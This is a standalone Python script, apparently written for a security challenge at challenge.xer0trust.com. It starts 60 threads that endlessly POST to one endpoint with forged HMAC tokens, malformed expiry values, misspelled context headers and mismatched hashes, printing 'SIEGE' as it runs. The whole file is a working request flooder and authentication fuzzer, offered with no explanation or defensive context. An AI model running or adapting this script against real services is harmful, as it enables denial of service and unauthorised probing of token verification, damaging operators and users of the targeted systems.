#!/usr/bin/env python3
import base64,hashlib,hmac,json,time,uuid,ssl,threading,random,http.client

HOST="challenge.xer0trust.com"
PATH="/nuvl"
THREADS=60
FS=b"WRONG_SECRET"
SC=ssl.create_default_context()
CTX_GOOD="ctx_demo"
CTX_BAD=["demo","CTX_demo","ctx-demo","Ctx_demo","context_demo"]

def tok(r,c,n,e):
    s=hmac.new(FS,f"{r}|{c}|{n}|{e}".encode(),hashlib.sha256).hexdigest()
    return base64.urlsafe_b64encode(json.dumps({"r":r,"c":c,"n":n,"e":e,"s":s},separators=(",",":")).encode()).decode()

def worker():
    conn=http.client.HTTPSConnection(HOST,443,timeout=10,context=SC)
    while True:
        try:
            b=json.dumps({"op":"demo","ts":int(time.time()),"nonce":uuid.uuid4().hex},separators=(",",":")).encode()
            r=hashlib.sha256(b).hexdigest()
            n=uuid.uuid4().hex
            pick=random.randint(0,6)
            if pick==0:
                c=random.choice(CTX_BAD);e=str(int(time.time())+60)
            elif pick==1:
                c=CTX_GOOD;r=hashlib.sha256(uuid.uuid4().bytes).hexdigest();e=str(int(time.time())+60)
            elif pick==2:
                c="ctx_other";e=str(int(time.time())+60)
            elif pick==3:
                c=CTX_GOOD;e=str(int(time.time())-random.randint(1,3600))
            elif pick==4:
                c=CTX_GOOD;e=random.choice(["NaN","abc","","Infinity","1.5"])
            else:
                c=CTX_GOOD;e=str(int(time.time())+60)
            t=tok(r,c,n,e)
            conn.request("POST",PATH,body=b,headers={"Content-Type":"application/json","Content-Length":str(len(b)),"X-Verification-Context":c,"X-Provider-Token":t})
            resp=conn.getresponse();resp.read()
        except:
            try:conn.close()
            except:pass
            conn=http.client.HTTPSConnection(HOST,443,timeout=10,context=SC)

for _ in range(THREADS):
    threading.Thread(target=worker,daemon=True).start()
print(f"SIEGE: {THREADS} threads -> {HOST}{PATH}")
try:
    while True:time.sleep(60)
except KeyboardInterrupt:
    print("done")
